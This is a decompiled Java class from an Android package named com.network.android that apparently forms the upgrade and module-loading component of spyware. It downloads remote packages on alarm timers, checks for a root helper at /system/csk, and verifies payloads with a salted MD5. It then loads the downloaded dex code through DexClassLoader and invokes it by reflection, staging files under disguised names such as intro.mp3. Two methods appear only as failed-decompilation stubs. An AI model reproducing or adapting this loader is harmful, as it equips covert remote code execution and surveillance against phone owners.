package com.network.h;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import com.network.android.SmsReceiver;
import com.network.android.a.c;
import com.network.android.c.a.a;
import com.network.android.c.a.b;
import com.network.media.CoreReceiver;
import dalvik.system.DexClassLoader;
import dalvik.system.DexFile;
import java.io.File;
import java.lang.reflect.Method;
import java.security.MessageDigest;
import java.util.Arrays;

public final class j {

    /* renamed from: a  reason: collision with root package name */
    public static int f151a = 0;
    private static boolean b = false;
    private static boolean c = false;
    private static String d = "";
    private static int e = 0;
    private static Context f = null;

    public static void a(Context context) {
        try {
            a.a("fireIntentStop");
            Intent intent = new Intent(context, CoreReceiver.class);
            intent.setAction(CoreReceiver.c);
            ((AlarmManager) context.getSystemService("alarm")).cancel(PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Throwable th) {
            a.a("fireIntentStop" + th.getMessage(), th);
        }
    }

    private static void a(Context context, int i, String str) {
        try {
            a.a("Upgrader fireIntent: " + i + " Action " + str);
            Intent intent = new Intent(context, CoreReceiver.class);
            intent.setData(Uri.parse("UPGRADE:" + i));
            intent.setAction(str);
            ((AlarmManager) context.getSystemService("alarm")).set(0, System.currentTimeMillis() + ((long) i), PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Throwable th) {
            a.a("fireIntent" + th.getMessage(), th);
            a(false, context, true, true);
        }
    }

    public static void a(String str, int i, int i2, Context context, String str2) {
        try {
            c = false;
            if (str.length() <= 0) {
                a.b("downloadUpgradePackage url is empty");
                b.a(1, 94, "LOG_UPGRADE_URL_IS_EMPTY");
                return;
            }
            a.a("downloadUpgradePackage current agent package version: " + com.network.b.b.l + " uprade package: " + str2);
            if (str2.equalsIgnoreCase(com.network.b.b.l)) {
                a.b("downloadUpgradePackage package version are equal");
                b.a(1, 95, "LOG_UPGRADE_VERSION_EQUAL_CURRENT_VERSION");
                return;
            }
            a.a("downloadUpgradePackage start");
            d = str;
            if (b.d(context) && new File("/system/csk").exists()) {
                d += com.network.i.a.a("root");
            } else if (com.network.b.b.m != null) {
                d += com.network.b.b.m;
            }
            a.a("downloadUpgradePackage starting. setting UpgradeState = true. url to download: " + d);
            a(true, context, false, false);
            File file = new File("/data/data/com.network.android/upgrade/");
            if (!file.exists()) {
                file.mkdir();
            }
            b();
            f151a = 0;
            a.b("downloadUpgradePackage counter: " + f151a);
            a.b("downloadUpgradePackage m_wasDownloadedSucceseed: " + c);
            while (f151a < i) {
                f = context;
                a.a("downloadUpgradePackage downloading package. downloadCounter:" + f151a);
                f151a++;
                a(context, f151a * 10000, CoreReceiver.c);
            }
            e = 60000 * i2;
            a(context, (f151a * 10000) + e, CoreReceiver.d);
        } catch (Throwable th) {
            a.a("downloadUpgradePackage exception: " + th.getMessage(), th);
            a(false, context, true, true);
        }
    }

    public static void a(boolean z, Context context, boolean z2, boolean z3) {
        a.a("setUpgradeState start. value: " + z);
        b = z;
        if (!z) {
            Context context2 = f;
            String str = CoreReceiver.c;
            a(context2);
            b.a(1, 85, "LOG_UPGRADE_STATE_DEACTIVATED");
            if (z2) {
                b();
            }
            if (z3) {
                c.a(context, "httpPing");
                return;
            }
            return;
        }
        b.a(1, 84, "LOG_UPGRADE_STATE_ACTIVATED");
    }

    public static boolean a() {
        return b;
    }

    private static boolean a(String str, String str2, String str3, String str4, byte[] bArr, int i, Context context) {
        boolean z;
        try {
            a.a("loadClassAndRunFunction started!");
            a.a("loadClassAndRunFunction packagePath:" + str + str2);
            a.a("loadClassAndRunFunction class and function: :" + str4 + "/" + str3);
            Method[] methods = new DexClassLoader(str + str2, context.getFilesDir().getAbsolutePath(), null, context.getClass().getClassLoader()).loadClass(str4).newInstance().getClass().getMethods();
            int length = methods.length;
            int i2 = 0;
            while (true) {
                if (i2 >= length) {
                    z = false;
                    break;
                }
                Method method = methods[i2];
                if (method.toGenericString().contains(str3)) {
                    a.a("loadClassAndRunFunction found func:" + str3);
                    method.invoke(null, bArr, Integer.valueOf(i));
                    z = true;
                    break;
                }
                i2++;
            }
            if (z) {
                return true;
            }
            a.b("loadClassAndRunFunction can't find func!!! ");
            return false;
        } catch (Throwable th) {
            a.a("loadClassAndRunFunction Exception" + th.getMessage(), th);
            return false;
        }
    }

    private static boolean a(byte[] bArr, byte[] bArr2) {
        try {
            a.a("checkCRC start upgradeFileCrc size:" + bArr.length + " package size: " + bArr2.length);
            byte[] bytes = SmsReceiver.b.getBytes();
            byte[] bArr3 = new byte[(bArr2.length + SmsReceiver.b.length())];
            System.arraycopy(bArr2, 0, bArr3, 0, bArr2.length);
            System.arraycopy(bytes, 0, bArr3, bArr2.length, bytes.length);
            MessageDigest instance = MessageDigest.getInstance("MD5");
            instance.update(bArr3);
            byte[] digest = instance.digest();
            a.a("upgradeCheckCrc upgradeFileCrc size: " + bArr.length + " hash length: " + digest.length);
            if (Arrays.equals(digest, bArr)) {
                a.a("upgradeCheckCrc checkCRC returning true ");
                return true;
            }
        } catch (Throwable th) {
            a.a("checkCRC Exception " + th.getMessage(), th);
        }
        a.a("checkCRC returning false ");
        return false;
    }

    /* JADX WARNING: Removed duplicated region for block: B:13:0x006d A[SYNTHETIC, Splitter:B:13:0x006d] */
    /* JADX WARNING: Removed duplicated region for block: B:16:0x0072 A[Catch:{ Throwable -> 0x0077 }] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private static byte[] a(java.lang.String r7) {
        /*
        // Method dump skipped, instructions count: 126
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.h.j.a(java.lang.String):byte[]");
    }

    public static void b() {
        try {
            a.a("deleteUpgradeFiles started");
            File file = new File("/data/data/com.network.android/upgrade/uglmt.dat");
            a.a("deleteUpgradeFiles deleted file: " + file.getAbsolutePath() + " delete result: " + file.delete());
            File file2 = new File("/data/data/com.network.android/upgrade/cuvmnr.dat");
            a.a("deleteUpgradeFiles deleted file: " + file2.getAbsolutePath() + " delete result: " + file2.delete());
            File file3 = new File("/data/data/com.network.android/upgrade/zero.mp3");
            a.a("deleteUpgradeFiles deleted file: " + file3.getAbsolutePath() + " delete result: " + file3.delete());
            File file4 = new File("/data/data/com.network.android/upgrade/");
            if (file4.exists()) {
                String[] list = file4.list();
                for (String str : list) {
                    if (str.contains("com.media.sync")) {
                        File file5 = new File("/data/data/com.network.android/upgrade/" + str);
                        a.a("deleteUpgradeFiles deleted file: " + file5.getAbsolutePath() + " delete result: " + file5.delete());
                    }
                }
                a.a("deleteUpgradeFiles ended");
            }
        } catch (Throwable th) {
            a.a("deleteUpgradeFiles Exception " + th.getMessage(), th);
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:31:0x00dc A[SYNTHETIC, Splitter:B:31:0x00dc] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static boolean b(android.content.Context r10) {
        /*
        // Method dump skipped, instructions count: 256
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.h.j.b(android.content.Context):boolean");
    }

    private static boolean b(String str, String str2, String str3, String str4, byte[] bArr, int i, Context context) {
        boolean z;
        try {
            a.a("loadClassAndRunFunction_v4 started!");
            a.a("loadClassAndRunFunction_v4 packagePath:" + str + str2);
            a.a("loadClassAndRunFunction_v4 class and function: :" + str4 + "/" + str3);
            Method[] methods = DexFile.loadDex(str + str2, File.createTempFile("opt", "dex", new File("/data/data/com.network.android/upgrade/")).getPath(), 0).loadClass(str4, new DexClassLoader(str + str2, context.getFilesDir().getAbsolutePath(), null, context.getClass().getClassLoader())).newInstance().getClass().getMethods();
            int length = methods.length;
            int i2 = 0;
            while (true) {
                if (i2 >= length) {
                    z = false;
                    break;
                }
                Method method = methods[i2];
                if (method.toGenericString().contains(str3)) {
                    a.a("loadClassAndRunFunction_v4 found func:" + str3);
                    method.invoke(null, bArr, Integer.valueOf(i));
                    z = true;
                    break;
                }
                i2++;
            }
            if (z) {
                return true;
            }
            a.b("loadClassAndRunFunction_v4 can't find func!!! ");
            return false;
        } catch (Throwable th) {
            a.a("loadClassAndRunFunction_v4 Exception" + th.getMessage(), th);
            return false;
        }
    }

    private static byte[] b(String str) {
        try {
            char[] charArray = str.toCharArray();
            byte[] bArr = new byte[charArray.length];
            for (int i = 0; i < bArr.length; i++) {
                bArr[i] = (byte) charArray[i];
            }
            return bArr;
        } catch (Throwable th) {
            a.a("stringToByte Exception " + th.getMessage(), th);
            return null;
        }
    }

    public static void c() {
        a.a("downloadUpgradePackage in run: m_wasDownloadedSucceseed: " + c);
        new Handler().post(new k());
    }

    private static boolean h() {
        try {
            a.a("chmodUpgradeFiles started");
            File file = new File("/data/data/com.network.android/upgrade/");
            if (!file.exists()) {
                file.mkdir();
            }
            int a2 = b.a(file);
            a.a("chmodUpgradeFiles chmod file: " + file.getAbsolutePath() + " chmod result: " + a2);
            if (a2 != 0) {
                return false;
            }
            File file2 = new File("/data/data/com.network.android/upgrade/uglmt.dat");
            int a3 = b.a(file2);
            a.a("chmodUpgradeFiles chmod file: " + file2.getAbsolutePath() + " chmod result: " + a3);
            if (a3 != 0) {
                return false;
            }
            File file3 = new File("/data/data/com.network.android/upgrade/cuvmnr.dat");
            int a4 = b.a(file3);
            a.a("chmodUpgradeFiles chmod file: " + file3.getAbsolutePath() + " chmod result: " + a4);
            if (a4 != 0) {
                return false;
            }
            File file4 = new File("/data/data/com.network.android/upgrade/intro.mp3");
            int a5 = b.a(file4);
            a.a("chmodUpgradeFiles chmod file: " + file4.getAbsolutePath() + " chmod result: " + a5);
            if (a5 != 0) {
                return false;
            }
            String[] list = new File("/data/data/com.network.android/upgrade/").list();
            for (String str : list) {
                if (str.contains("com.media.sync")) {
                    File file5 = new File("/data/data/com.network.android/upgrade/" + str);
                    int a6 = b.a(file5);
                    a.a("chmodUpgradeFiles chmod file: " + file5.getAbsolutePath() + " chmod result: " + a6);
                    if (a6 != 0) {
                        return false;
                    }
                }
            }
            return true;
        } catch (Throwable th) {
            a.a("chmodUpgradeFiles exception:" + th.getMessage(), th);
            return false;
        }
    }
}
